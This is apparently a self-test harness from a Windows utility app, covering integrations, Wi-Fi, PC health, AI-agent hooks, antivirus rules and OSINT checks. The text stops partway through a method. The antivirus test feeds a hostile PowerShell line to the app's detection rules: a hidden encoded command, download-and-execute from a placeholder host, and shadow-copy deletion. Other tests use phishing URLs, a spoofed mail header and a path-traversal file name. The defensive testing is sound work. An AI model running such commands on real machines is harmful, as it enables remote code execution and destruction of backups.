using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NIsland.Core;

namespace NIsland.Services
{
    /// <summary>
    /// Самопроверка без интерфейса: NIsland.exe --selftest lyrics &lt;вход&gt; &lt;выход&gt;.
    /// Настройки и данные не читаются и не пишутся (Store.UseDefaults), кеш текстов выключен.
    /// Строка входа: «название|исполнитель|альбом|длительность, с|1 — из браузера».
    /// </summary>
    static class SelfTest
    {
        public static int Run(string[] args)
        {
            Store.UseDefaults();
            System.Text.Encoding.RegisterProvider(System.Text.CodePagesEncodingProvider.Instance);
            try
            {
                return args[1] switch
                {
                    "lyrics" => Task.Run(() => Lyrics(args[2], args[3])).GetAwaiter().GetResult(),
                    "hub" => Task.Run(() => { args2 = args.Length > 3 ? args[3].Split(',') : null; return Hub(args[2]); }).GetAwaiter().GetResult(),
                    "dedupe" => DedupeTest(args[2]),
                    "net" => Task.Run(() => NetTest(args[2])).GetAwaiter().GetResult(),
                    "audio" => AudioTest(args[2]),
                    "osint2" => Task.Run(() => Osint2Test(args[2])).GetAwaiter().GetResult(),
                    "tgbot" => TgBotTest.Run(args[2]),
                    "viz" => VizBench(args[2]),
                    "mascot" => MascotSheet(args[2]),
                    "elev" => ElevBench(args[2]),
                    "av" => Task.Run(() => AvTest(args[2])).GetAwaiter().GetResult(),
                    "custom" => Task.Run(() => CustomTest(args[2])).GetAwaiter().GetResult(),
                    "mcp" => McpTest.Run(args[2]),
                    "health" => Task.Run(() => HealthTest(args[2])).GetAwaiter().GetResult(),
                    "agents" => Task.Run(() => AgentsTest(args[2])).GetAwaiter().GetResult(),
                    "weather" => Task.Run(() => WeatherTest(args[2])).GetAwaiter().GetResult(),
                    "wifi2" => Task.Run(() => Wifi2Test(args[2])).GetAwaiter().GetResult(),
                    _ => 2,
                };
            }
            catch (Exception e) { File.WriteAllText(args[^1], e.ToString()); return 1; }
        }

        /// <summary>Новые инструменты сети — только чтение: ничего не переключает и не чинит.</summary>
        static async Task<int> Wifi2Test(string output)
        {
            var sb = new StringBuilder();
            async Task T(string name, Func<Task<string>> f)
            {
                var sw = Stopwatch.StartNew();
                try { sb.AppendLine($"== {name} ({sw.ElapsedMilliseconds} ms)\n" + await f()); }
                catch (Exception e) { sb.AppendLine($"== {name} FAIL {e.GetType().Name}: {e.Message}"); }
            }
            await T("adapter", () => Task.FromResult(string.Join("\n", WifiTools2.AdapterInfo().Select(r => r.K + ": " + r.V))));
            await T("hotspot", () => Task.FromResult(WifiTools2.HotspotState()?.ToString() ?? "null"));
            await T("dns", async () => string.Join("\n", (await WifiTools2.DnsBenchmark()).Select(d => $"{d.Name} {d.Ip} {d.Ms:0}")));
            await T("trace", async () => string.Join("\n", (await WifiTools2.Trace("google.com")).Select(h => $"{h.Hop} {h.Ip} {h.Host} {h.Ms:0}")));
            await T("regions", async () => string.Join("\n", await Task.WhenAll(WifiTools2.Regions.Select(async r => r.Name + " " + (await WifiTools2.TcpMs(r.Host)).ToString("0")))));
            await T("security", async () => string.Join("\n", WifiTools2.Security(await WifiTools.Nearby()).Select(x => x.Level + " " + x.Title)));
            await T("stability10s", async () => { var r = await WifiTools2.Stability(10, null); return $"{r.Verdict} avg={r.Avg:0} jit={r.Jitter:0} lost={r.Lost}"; });
            await T("password", () => Task.FromResult(WifiTools2.StrongPassword() + " " + WifiTools2.Strength(WifiTools2.StrongPassword()) + " / 12345678 " + WifiTools2.Strength("12345678")));
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        static async Task<int> WeatherTest(string output)
        {
            Store.Settings.WeatherCity = "Mykolaiv";
            var w = await WeatherService.Get(true);
            var sb = new StringBuilder();
            if (w == null) sb.AppendLine("null: " + WeatherService.LastError);
            else
            {
                sb.AppendLine($"{w.City} {w.Temp}° feels {w.Feels} dew {w.DewPoint} vis {w.Visibility} cloud {w.Cloud} aqi {w.Aqi}");
                sb.AppendLine("pollen: " + string.Join(", ", w.Pollen.Select(p => p.Key + "=" + p.Value)) + " → " + WeatherService.PollenText(w));
                sb.AppendLine("gusts/day: " + string.Join(" ", w.DayGust) + " precip: " + string.Join(" ", w.DayPrecip));
                sb.AppendLine("moon: " + WeatherService.Moon(DateTime.Now));
                sb.AppendLine("tomorrow: " + WeatherService.Tomorrow(w));
                sb.AppendLine("danger: " + WeatherService.Danger(w));
                foreach (var a in WeatherService.Advice(w)) sb.AppendLine("advice: " + a);
            }
            sb.AppendLine("Lviv: " + await WeatherService.Brief("Lviv"));
            sb.AppendLine("Nowhere: " + await WeatherService.Brief("Qwxzzz"));
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        static async Task<int> AgentsTest(string output)
        {
            var sb = new StringBuilder();
            foreach (var a in await Agents.Detect()) sb.AppendLine($"found {a.Kind.Name} {a.Version} {a.Path}");
            foreach (var r in await Agents.Running()) sb.AppendLine($"running {r.Pid} {r.Agent} {r.Started:HH:mm} {r.CommandLine}");
            var u = await Agents.ClaudeUsageToday();
            sb.AppendLine($"usage today: sessions {u.Sessions} in {u.In} out {u.Out} cache {u.Cache}");
            sb.AppendLine("parse: " + Agents.ParseForTest("claude", "{\"hook_event_name\":\"Notification\",\"message\":\"Claude needs your permission to use Bash\",\"cwd\":\"C:\\\\Proj\\\\app\"}"));
            sb.AppendLine("parse: " + Agents.ParseForTest("claude", "{\"hook_event_name\":\"Stop\",\"cwd\":\"C:\\\\Proj\\\\app\"}"));
            sb.AppendLine("parse: " + Agents.ParseForTest("codex", "{\"type\":\"agent-turn-complete\",\"last-assistant-message\":\"Fixed 3 tests\"}"));
            // хуки — на временной папке вместо настоящей домашней
            var tmp = Path.Combine(Path.GetTempPath(), "nisland-agents-test-" + Guid.NewGuid().ToString("N")[..6]);
            Directory.CreateDirectory(Path.Combine(tmp, ".claude"));
            Directory.CreateDirectory(Path.Combine(tmp, ".codex"));
            File.WriteAllText(Path.Combine(tmp, ".claude", "settings.json"), "{\n  \"model\": \"opus\",\n  \"hooks\": { \"Stop\": [ { \"hooks\": [ { \"type\": \"command\", \"command\": \"echo mine\" } ] } ] }\n}");
            File.WriteAllText(Path.Combine(tmp, ".codex", "config.toml"), "model = \"gpt-5\"\n\n[profiles.fast]\nmodel = \"o4-mini\"\n");
            Agents.HomeOverride = tmp;
            sb.AppendLine("hook claude: " + (Agents.HookClaude(true) ?? "ok") + " hooked=" + Agents.ClaudeHooked());
            sb.AppendLine(File.ReadAllText(Path.Combine(tmp, ".claude", "settings.json")));
            sb.AppendLine("unhook claude: " + (Agents.HookClaude(false) ?? "ok") + " hooked=" + Agents.ClaudeHooked());
            sb.AppendLine(File.ReadAllText(Path.Combine(tmp, ".claude", "settings.json")));
            sb.AppendLine("hook codex: " + (Agents.HookCodex(true) ?? "ok") + " hooked=" + Agents.CodexHooked());
            sb.AppendLine(File.ReadAllText(Path.Combine(tmp, ".codex", "config.toml")));
            sb.AppendLine("unhook codex: " + (Agents.HookCodex(false) ?? "ok") + " hooked=" + Agents.CodexHooked());
            Agents.HomeOverride = null;
            Directory.Delete(tmp, true);
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        /// <summary>Здоровье ПК — только чтение (турбо, обновления и удаление не вызываются).</summary>
        static async Task<int> HealthTest(string output)
        {
            var sb = new StringBuilder();
            async Task T(string name, Func<Task<string>> f)
            {
                var sw = Stopwatch.StartNew();
                string r;
                try { r = await f(); } catch (Exception e) { r = "FAIL " + e.GetType().Name + ": " + e.Message; }
                sb.AppendLine($"== {name} ({sw.ElapsedMilliseconds} ms)");
                sb.AppendLine(r);
            }
            await T("score", async () => { var (s, i) = await PcHealth.Score(_ => { }); return s + "\n" + string.Join("\n", i.Select(x => $"-{x.Penalty} {x.Title} | {x.Advice}")); });
            await T("raw", () => Task.FromResult(Maint.RunCmd("wevtutil", "qe Application /q:\"*[System[(EventID=1000)]]\" /c:2 /rd:true /f:xml") is var raw ? raw.Length + " " + (raw.Length > 300 ? raw[..300] : raw) : ""));
            await T("crashes", async () => string.Join("\n", (await PcHealth.Crashes(30)).Take(12).Select(c => $"{c.At:dd.MM HH:mm} {c.Kind} {c.App} {c.Detail}")));
            await T("devices", async () => string.Join("\n", (await PcHealth.ProblemDevices()).Select(d => $"{d.Name} {d.Code} {d.Meaning}")));
            await T("cpu", async () => (await PcHealth.Cpu()).ToString());
            await T("wu", async () => (await PcHealth.WindowsUpdate()).ToString() + " trim=" + PcHealth.TrimState());
            await T("disk", async () => string.Join("\n", (await PcHealth.DiskUsage()).Select(d => $"{d.Name} {Maint.Size(d.Bytes)}")));
            await T("large", async () => string.Join("\n", (await PcHealth.LargeFiles(8)).Select(f => $"{Maint.Size(f.Length)} {f.FullName}")));
            await T("dups", async () => { var g = await PcHealth.Duplicates(null); return $"groups {g.Count}\n" + string.Join("\n", g.Take(5).Select(x => $"{x.Count}× {Maint.Size(x[0].Length)} {x[0].Name}")); });
            await T("winget", async () => { var (l, e) = await PcHealth.WingetUpgrades(); return (e ?? "") + $" count {l.Count}\n" + string.Join("\n", l.Take(8).Select(u => $"{u.Name} | {u.Id} | {u.Current} -> {u.Available}")); });
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        static async Task<int> CustomTest(string output)
        {
            var sb = new StringBuilder();
            async Task Try(CustomHub h)
            {
                for (int round = 1; round <= 2; round++)
                {
                    try { await h.Poll(); sb.AppendLine($"{h.Name} #{round}: {h.Status}"); foreach (var r in h.Rows.Take(3)) sb.AppendLine($"   · {r.Title} | {r.Sub} | {r.Url}"); }
                    catch (Exception e) { sb.AppendLine($"{h.Name} #{round}: FAIL {e.GetType().Name}: {e.Message}"); }
                }
            }
            foreach (var name in new[] { "Биткоин (CoinGecko)", "Hacker News по слову", "Погода по координатам (Open-Meteo)", "Новые вопросы Stack Overflow по тегу" })
                await Try(CustomHubs.Create(CustomHubs.Templates.First(t => t.Name == name)));
            var page = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "page"), "Пример страницы");
            Integrations.SetValue(page, "url", "https://example.com");
            await Try(page);
            var page2 = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "page"), "Заголовок страницы");
            Integrations.SetValue(page2, "url", "https://example.com"); Integrations.SetValue(page2, "regex", "<h1>(.*?)</h1>");
            await Try(page2);
            var st = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "status"), "Несуществующий сайт");
            Integrations.SetValue(st, "url", "https://nonexistent.invalid");
            await Try(st);
            var bad = CustomHubs.Create(CustomHubs.Templates.First(t => t.Kind == "list"), "Неверный путь");
            Integrations.SetValue(bad, "url", "https://hn.algolia.com/api/v1/search?query=x"); Integrations.SetValue(bad, "items", "nope"); Integrations.SetValue(bad, "title", "title");
            await Try(bad);
            sb.AppendLine("path test: " + CustomHub.Path(System.Text.Json.JsonDocument.Parse("{\"a\":{\"b\":[{\"c\":5}]}}").RootElement, "a.b[0].c"));
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        static async Task<int> AvTest(string output)
        {
            var sb = new StringBuilder();
            var sw = Stopwatch.StartNew();
            sb.AppendLine("db update: " + (await Antivirus.UpdateDb() ?? "ok") + $" · {Antivirus.DbCount} записей · {sw.ElapsedMilliseconds} ms");
            sb.AppendLine("amsi benign: " + Antivirus.AmsiMalware(Encoding.UTF8.GetBytes("Write-Host 'hello world'"), "test.ps1"));
            sb.AppendLine("script rules: " + string.Join(" | ", Antivirus.ScriptRulesForTest("powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA; iex (New-Object Net.WebClient).DownloadString('http://x'); vssadmin delete shadows /all")));
            sb.AppendLine("script rules clean: " + Antivirus.ScriptRulesForTest("Get-ChildItem C:\\ | Sort-Object Length").Count);
            foreach (var f in new[] { Environment.SystemDirectory + "\\notepad.exe", Environment.SystemDirectory + "\\kernel32.dll", Environment.ProcessPath,
                                      @"C:\Users\maksym\Desktop\LibreOffice_26.8.0_Win_x86-64.msi" })
            {
                if (!File.Exists(f)) continue;
                sw.Restart();
                var t = Antivirus.ScanFile(f);
                sb.AppendLine($"scan {Path.GetFileName(f)}: {t.Score} {t.Verdict} · {sw.ElapsedMilliseconds} ms · {string.Join(" | ", t.Reasons)}");
            }
            sw.Restart();
            var found = await Antivirus.QuickScan(null, default);
            sb.AppendLine($"quick scan: {Store.Settings.AvLastCount} files, {found.Count} flagged, {sw.ElapsedMilliseconds} ms");
            foreach (var t in found.Take(15)) sb.AppendLine($"  {t.Score} {t.Verdict} {t.Path} · {string.Join(" | ", t.Reasons)}");
            foreach (var a in await Antivirus.Audit()) sb.AppendLine($"audit {a.Level}: {a.Title} | {a.Advice}");
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        /// <summary>Лист превью персонажа: все настроения × облики и все аксессуары (PNG рядом с выходным файлом).</summary>
        static int MascotSheet(string output)
        {
            const int S = 72;
            var moods = NIsland.Controls.Mascot.MoodNames;
            var skins = NIsland.Controls.Mascot.Skins;
            var hats = NIsland.Controls.Mascot.Hats;
            int cols = moods.Length, rows = skins.Length + 1;
            var dv = new System.Windows.Media.DrawingVisual();
            var sb = new StringBuilder();
            using (var dc = dv.RenderOpen())
            {
                dc.DrawRectangle(System.Windows.Media.Brushes.Black, null, new System.Windows.Rect(0, 0, cols * S, rows * S + 20));
                for (int r = 0; r < rows; r++)
                    for (int c = 0; c < cols; c++)
                    {
                        if (r == skins.Length && c >= hats.Length) continue;
                        var m = new NIsland.Controls.Mascot { Width = S - 12, Height = S - 12, Skin = r < skins.Length ? skins[r].Key : "blob", Hat = r < skins.Length ? "none" : hats[c].Key, IdleAnims = false };
                        m.Mood = r < skins.Length ? moods[c].Key : "idle";
                        m.Measure(new System.Windows.Size(S - 12, S - 12));
                        m.Arrange(new System.Windows.Rect(0, 0, S - 12, S - 12));
                        var rtb = new System.Windows.Media.Imaging.RenderTargetBitmap(S - 12, S - 12, 96, 96, System.Windows.Media.PixelFormats.Pbgra32);
                        try { rtb.Render(m); } catch (Exception e) { sb.AppendLine($"ERROR {m.Skin}/{m.Mood}/{m.Hat}: {e.Message}"); }
                        dc.DrawImage(rtb, new System.Windows.Rect(c * S + 6, r * S + 14, S - 12, S - 12));
                        var label = r < skins.Length ? (r == 0 ? moods[c].Key : null) : hats[c].Key;
                        if (label != null)
                            dc.DrawText(new System.Windows.Media.FormattedText(label, System.Globalization.CultureInfo.InvariantCulture, System.Windows.FlowDirection.LeftToRight,
                                new System.Windows.Media.Typeface("Segoe UI"), 10, System.Windows.Media.Brushes.Gray, 1), new System.Windows.Point(c * S + 3, r * S + (r == 0 ? 0 : 2)));
                    }
            }
            var img = new System.Windows.Media.Imaging.RenderTargetBitmap(cols * S, rows * S + 20, 96, 96, System.Windows.Media.PixelFormats.Pbgra32);
            img.Render(dv);
            var enc = new System.Windows.Media.Imaging.PngBitmapEncoder();
            enc.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(img));
            using (var fs = File.Create(Path.ChangeExtension(output, ".png"))) enc.Save(fs);
            sb.AppendLine($"moods={moods.Length} skins={skins.Length} hats={hats.Length}");
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        /// <summary>Задание администратора: хеш, вложения, запуск cmd (без UAC — в обычном процессе), подмена файла.</summary>
        static int ElevBench(string output)
        {
            var sb = new StringBuilder();
            var dir = Path.Combine(Path.GetTempPath(), "ni-elev-test");
            Directory.CreateDirectory(dir);
            var outFile = Path.Combine(dir, "out.txt");
            var job = new NIsland.Services.Elevated.ScriptJob("@echo off\r\ntype \"%NI_DIR%\\a.txt\" > \"" + outFile + "\"\r\nexit /b 7\r\n",
                new Dictionary<string, string> { ["a.txt"] = "привет" }, null);
            var bytes = System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(job);
            var jf = Path.Combine(dir, "t.job.json");
            File.WriteAllBytes(jf, bytes);
            var hash = Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(bytes));
            int code = NIsland.Services.Elevated.RunScriptJob(new[] { "--elevated-script", jf, hash });
            sb.AppendLine($"run: code={code} out={(File.Exists(outFile) ? File.ReadAllText(outFile).Trim() : "(none)")}");
            File.AppendAllText(jf, " ");
            int bad = NIsland.Services.Elevated.RunScriptJob(new[] { "--elevated-script", jf, hash });
            sb.AppendLine($"tampered: code={bad}");
            var bad2 = new NIsland.Services.Elevated.ScriptJob("echo", new Dictionary<string, string> { ["..\\x.cmd"] = "x" }, null);
            var b2 = System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(bad2);
            File.WriteAllBytes(jf, b2);
            sb.AppendLine($"bad name: code={NIsland.Services.Elevated.RunScriptJob(new[] { "--elevated-script", jf, Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(b2)) })}");
            try { Directory.Delete(dir, true); } catch { }
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        static int VizBench(string output)
        {
            File.WriteAllText(output, NIsland.Controls.Visualizer.Bench(320, 180, Path.ChangeExtension(output, ".png")));
            return 0;
        }

        /// <summary>Какие интеграции проверять (selftest hub out ключ1,ключ2) — по умолчанию все из списка.</summary>
        static string[] args2;

        /// <summary>Захват звука 4 секунды: кадры, частота, громкость, удары, спектр по полосам.</summary>
        static int AudioTest(string output)
        {
            var sb = new StringBuilder();
            using (AudioCapture.I.Use())
            {
                var bands = new float[AudioCapture.BandCount];
                double maxLevel = 0;
                for (int i = 0; i < 40; i++)
                {
                    System.Threading.Thread.Sleep(100);
                    maxLevel = Math.Max(maxLevel, AudioCapture.I.Level);
                }
                AudioCapture.I.Read(bands, null, null);
                sb.AppendLine($"running={AudioCapture.I.Running} rate={AudioCapture.I.SampleRate} frames={AudioCapture.I.Frame} maxLevel={maxLevel:0.00} beats={AudioCapture.I.Beats} bpm={AudioCapture.I.Bpm} error={AudioCapture.I.Error}");
                sb.AppendLine("bands: " + string.Join(" ", bands.Select(b => ((int)(b * 9)).ToString())));
            }
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        static async Task<int> Osint2Test(string output)
        {
            var sb = new StringBuilder();
            async Task T(string name, Func<Task<string>> f)
            {
                try { sb.AppendLine($"== {name}\n{await f()}"); }
                catch (Exception e) { sb.AppendLine($"== {name} FAIL {e.Message}"); }
            }
            string Tab(IEnumerable<(string K, string V)> r) => string.Join("\n", r.Select(x => $"  {x.K}: {x.V}"));
            await T("file exe", () => Task.FromResult(Tab(Osint.CheckFile(Environment.ProcessPath).Items) + "\n" + string.Join("\n", Osint.CheckFile(Environment.ProcessPath).Signals)));
            await T("file notepad", () => Task.FromResult(Tab(Osint.CheckFile(@"C:\Windows\System32\notepad.exe").Items)));
            await T("email", async () => Tab(await Osint.EmailCheck("test@gmail.com")));
            await T("email disposable", async () => Tab(await Osint.EmailCheck("x@mailinator.com")));
            await T("tech", async () => Tab(await Osint.SiteTech("wordpress.org")));
            await T("ports", async () => Tab(await Osint.Ports("scanme.nmap.org")));
            await T("mac", async () => await Osint.MacVendor("3C:22:FB:00:00:00"));
            await T("hidden", () => Task.FromResult(string.Join("\n", Osint.HiddenChars("pаypal\u200B.com тест").Found)));
            var hdr = "Received: from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41])\n by mx.example.com with SMTPS id x; Tue, 03 Nov 2026 10:00:05 +0000\n" +
                      "Received: from [10.0.0.5] by smtp.gmail.com; Tue, 03 Nov 2026 10:00:01 +0000\nAuthentication-Results: mx.example.com; spf=pass smtp.mailfrom=x@gmail.com; dkim=pass; dmarc=fail\n" +
                      "From: =?UTF-8?B?0J/RgNC40LLQtdGC?= <a@gmail.com>\nReply-To: <b@evil.xyz>\nSubject: Hello\nDate: Tue, 03 Nov 2026 10:00:00 +0000\n\nbody";
            await T("headers", () => { var (i, s) = Osint.EmailHeaders(hdr); return Task.FromResult(Tab(i) + "\n" + string.Join("\n", s)); });
            File.WriteAllText(output, sb.ToString());
            return 0;
        }

        /// <summary>Интеграции на живых сервисах: открытые — должны работать, с ключами — понятная ошибка при неверном токене.</summary>
        static async Task<int> Hub(string output)
        {
            var sb = new StringBuilder();
            void Cfg(string key, params (string F, string V)[] values)
            {
                var it = Integrations.Get(key);
                foreach (var (f, v) in values) Integrations.SetValue(it, f, v);
                it.Cfg.Enabled = true;
            }
            Cfg("ntfy", ("topic", "nisland-selftest-" + Guid.NewGuid().ToString("N")[..10]));
            Cfg("rates", ("base", "UAH"), ("cur", "USD, EUR"), ("crypto", "bitcoin"));
            Cfg("novaposhta", ("ttn", "20400048799000"));
            Cfg("uptime", ("urls", "https://example.com\nhttps://nonexistent.invalid"));
            Cfg("rss", ("feeds", "https://www.pravda.com.ua/rss/view_news/\nhttps://hnrss.org/frontpage"));
            Cfg("ics", ("urls", "https://calendar.google.com/calendar/ical/uk.ukrainian%23holiday%40group.v.calendar.google.com/public/basic.ics"));
            Cfg("telegram", ("token", "123456:WRONG"));
            Cfg("github", ("token", "ghp_wrong"));
            Cfg("todoist", ("token", "wrong"));
            Cfg("listenbrainz", ("token", "wrong"));
            Cfg("ha", ("url", "http://127.0.0.1:59999"), ("token", "x"), ("entities", "light.kitchen"));
            Cfg("discord", ("url", "https://discord.com/api/webhooks/0/wrong"));
            Cfg("stocks", ("symbols", "AAPL, ^GSPC, EURUSD=X"));
            Cfg("hn", ("score", "300"));
            Cfg("mail", ("host", "imap.gmail.com"), ("user", "nisland.selftest@gmail.com"), ("password", "wrong"));
            Cfg("toggl", ("token", "wrong"));
            Cfg("linear", ("key", "wrong"));
            Cfg("bluesky", ("handle", "nisland-selftest.bsky.social"), ("password", "wrong-wrong"));
            Cfg("releases", ("repos", "Neizvestnyi22/N-Island\nobsproject/obs-studio\nnot/existing-repo-xyz"));
            Cfg("deals", ("max", "5"), ("watch", "Hollow Knight"));
            Cfg("games"); Cfg("quakes", ("radius", "20000")); Cfg("kp"); Cfg("apod"); Cfg("onthisday");
            {
                var n = Integrations.Get("ntfy");
                var sw0 = Stopwatch.StartNew();
                try { await n.Send(new HubEvent("test", "N-Island подключён ✓", "Проверка")); sb.AppendLine($"ntfy send {sw0.ElapsedMilliseconds} ms"); }
                catch (Exception e) { sb.AppendLine($"ntfy send FAIL {sw0.ElapsedMilliseconds} ms {e.GetType().Name}: {e.Message} {e.InnerException?.Message}"); }
                sw0.Restart();
                try { await n.Poll(); sb.AppendLine($"ntfy poll {sw0.ElapsedMilliseconds} ms"); }
                catch (Exception e) { sb.AppendLine($"ntfy poll FAIL {sw0.ElapsedMilliseconds} ms {e.GetType().Name}: {e.Message} {e.InnerException?.Message}"); }
            }
            foreach (var key in args2 ?? new[] { "ntfy", "rates", "novaposhta", "uptime", "rss", "ics", "telegram", "github", "todoist", "listenbrainz", "ha", "discord",
                                                 "stocks", "hn", "mail", "toggl", "linear", "bluesky" })
            {
                var it = Integrations.Get(key);
                var sw = Stopwatch.StartNew();
                try
                {
                    var msg = await it.Test();
                    sb.AppendLine($"OK   {key,-13} {sw.ElapsedMilliseconds,5} ms  {msg}");
                    foreach (var r in it.Rows.Take(3)) sb.AppendLine($"       · {r.Title} | {r.Sub}");
                }
                catch (Exception e) { sb.AppendLine($"ERR  {key,-13} {sw.ElapsedMilliseconds,5} ms  {Integrations.Reason(e)}"); }
            }
            // календарь: разбор повторов и часовых поясов на своём примере
            var ics = "BEGIN:VCALENDAR\nBEGIN:VEVENT\nDTSTART;TZID=Europe/Kyiv:20261102T090000\nDTEND;TZID=Europe/Kyiv:20261102T093000\nRRULE:FREQ=WEEKLY;BYDAY=MO,WE,FR\nSUMMARY:Планёрка\nEND:VEVENT\n" +
                      "BEGIN:VEVENT\nDTSTART:20261105T120000Z\nDTEND:20261105T130000Z\nSUMMARY:Созвон\\, важный\nLOCATION:Zoom\nEND:VEVENT\nBEGIN:VEVENT\nDTSTART;VALUE=DATE:20261110\nSUMMARY:Отпуск\nEND:VEVENT\nEND:VCALENDAR";
            foreach (var e in Ics.Parse(ics, new DateTime(2026, 11, 1), new DateTime(2026, 11, 12)))
                sb.AppendLine($"ics  {e.Start:ddd dd.MM HH:mm}–{e.End:HH:mm} {e.Title} {(e.AllDay ? "(весь день)" : "")} {e.Where}");
            File.WriteAllText(output, sb.ToString(), new UTF8Encoding(true));
            return 0;
        }

        /// <summary>«Без дублей» в тестовой ветке HKCU\Software\NIsland-SelfTest: выключили → вернули ровно как было.</summary>
        static int DedupeTest(string output)
        {
            const string root = @"Software\NIsland-SelfTest";
            var sb = new StringBuilder();
            var backup = Path.Combine(Path.GetTempPath(), "nisland-dedupe-selftest.json");
            try
            {
                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(root, false);
                using (var n = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(root + @"\Notifications\Settings"))
                {
                    n.CreateSubKey("Telegram.TelegramDesktop").Dispose();                                                  // баннер включён (значения нет)
                    using (var k = n.CreateSubKey("Chrome")) k.SetValue("ShowBanner", 0, Microsoft.Win32.RegistryValueKind.DWord);   // пользователь сам выключил
                    using (var k = n.CreateSubKey("Discord")) k.SetValue("ShowBanner", 1, Microsoft.Win32.RegistryValueKind.DWord);  // явно включён
                    n.CreateSubKey("Windows.SystemToast.SecurityAndMaintenance").Dispose();                                  // системное — не трогаем
                }
                using (var a = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(root + @"\AutoplayHandlers")) a.SetValue("DisableAutoplay", 0, Microsoft.Win32.RegistryValueKind.DWord);
                string Dump()
                {
                    using var n = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(root + @"\Notifications\Settings");
                    using var a = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(root + @"\AutoplayHandlers");
                    return string.Join(", ", n.GetSubKeyNames().OrderBy(x => x).Select(x => { using var k = n.OpenSubKey(x); return $"{x.Split('.')[0]}={k.GetValue("ShowBanner") ?? "—"}"; }))
                           + $" | autoplay={a.GetValue("DisableAutoplay") ?? "—"}";
                }
                Dedupe.UseSandbox(root, backup);
                Store.Settings.DedupeBanners = true;
                var before = Dump();
                sb.AppendLine("до:        " + before);
                Dedupe.ApplyBanners(true);
                Dedupe.ApplyAutoplay(true);
                Dedupe.OnApp("WhatsApp.Desktop");                       // новое приложение прислало уведомление
                sb.AppendLine("включено:  " + Dump() + $" | скрыто баннеров: {Dedupe.BannersHidden}");
                Dedupe.ApplyBanners(true);                              // повторное включение не должно затирать исходные значения
                Dedupe.Suspend();                                       // выход из N-Island
                var after = Dump();
                sb.AppendLine("выход:     " + after);
                // новое приложение после возврата остаётся с ключом, но без нашего значения
                sb.AppendLine(before.Replace("WhatsApp", "") == after.Replace(", WhatsApp=—", "") ? "ИТОГ: всё вернулось как было ✓" : "ИТОГ: РАСХОЖДЕНИЕ");
                sb.AppendLine("файл копии после возврата удалён: " + !File.Exists(backup));
            }
            catch (Exception e) { sb.AppendLine("ОШИБКА " + e); }
            finally { try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(root, false); } catch { } }
            File.WriteAllText(output, sb.ToString(), new UTF8Encoding(true));
            return 0;
        }

        /// <summary>Wi-Fi и OSINT на этом ПК и в интернете — только чтение.</summary>
        static async Task<int> NetTest(string output)
        {
            var sb = new StringBuilder();
            async Task Step(string name, Func<Task<string>> f)
            {
                var sw = Stopwatch.StartNew();
                try { sb.AppendLine($"OK   {name,-12} {sw.ElapsedMilliseconds,5} ms  {await f()}"); }
                catch (Exception e) { sb.AppendLine($"ERR  {name,-12} {sw.ElapsedMilliseconds,5} ms  {e.GetType().Name}: {e.Message}"); }
            }
            string T(IEnumerable<(string K, string V)> rows) => string.Join(" | ", rows.Select(r => r.K + ": " + r.V.Replace("\n", ", ")));
            await Step("wifi-link", async () => (await WifiTools.Current()) is { } l ? $"{l.Ssid} {l.Signal}% {l.Rssi}dBm ch{l.Channel} {l.Band} {l.Standard} ↓{l.RxMbps} ↑{l.TxMbps} {l.Security} bssid {l.Bssid}" : "нет подключения");
            await Step("wifi-scan", async () =>
            {
                var aps = await WifiTools.Nearby();
                var (now, best) = WifiTools.ChannelAdvice(aps, await WifiTools.Current());
                return $"{aps.Count} AP · {now} · {best}\n       " + string.Join("\n       ", aps.Take(8).Select(a => $"{a.Ssid} {a.Rssi}dBm ch{a.Channel} {a.Band} {a.Standard} {a.Security}{(a.Current ? " (текущая)" : "")}"));
            });
            await Step("health", async () =>
            {
                var (items, table, _) = await WifiTools.Health();
                return WifiTools.FreeChannels(table) + "\n       " + string.Join("\n       ", items.Select(i => $"[{i.Level}] {i.Title} — {i.Advice}"));
            });
            await Step("quality", async () => { var q = await WifiTools.TestQuality(); return $"{q.Verdict} · gw {q.GwMs:0}ms/{q.GwLoss:0}% · net {q.NetMs:0}ms/{q.NetLoss:0}% · dns {q.DnsMs:0}ms"; });
            await Step("devices", async () => { var d = await WifiTools.Devices(); return $"{d.Count}: " + string.Join("; ", d.Select(x => $"{x.Kind} {x.Ip} {x.Name}")); });
            await Step("link-ok", async () => { var r = await Osint.CheckLink("https://github.com"); return $"risk {r.Risk} · {r.Verdict} · " + string.Join(" / ", r.Signals.Select(s => s.Text)); });
            await Step("link-bad", async () => { var r = await Osint.CheckLink("http://paypal.com.secure-login-verify.xyz/account"); return $"risk {r.Risk} · {r.Verdict} · " + string.Join(" / ", r.Signals.Select(s => s.Text)); });
            await Step("unshorten", async () => string.Join(" → ", await Osint.Unshorten("http://github.com")));
            await Step("whois", async () => T(await Osint.Whois("github.com")));
            await Step("dns", async () => T(await Osint.DnsRecords("github.com")));
            await Step("cert", async () => T(await Osint.Certificate("github.com")));
            await Step("subdomains", async () => { var s = await Osint.Subdomains("n-island.dev"); return s.Count + " " + string.Join(", ", s.Take(5)); });
